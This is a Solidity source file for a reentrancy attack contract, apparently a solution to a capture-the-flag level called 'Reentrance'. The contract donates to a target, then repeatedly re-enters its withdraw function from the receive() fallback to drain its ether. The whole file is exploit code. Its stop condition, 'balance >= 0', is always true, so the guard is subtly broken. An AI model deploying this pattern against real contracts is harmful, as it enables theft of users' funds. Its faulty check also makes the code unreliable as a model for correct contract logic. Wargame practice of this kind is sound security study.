// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack {
    Reentrance reentrance;  
    uint256 amount = 0.001 ether;

    constructor(address _reentrance) {
        reentrance = Reentrance(_reentrance); 
    }

    receive() external payable {
        if (address(reentrance).balance >= 0) {
            reentrance.withdraw(amount);
        }
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(amount);
    }
}

interface Reentrance {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}
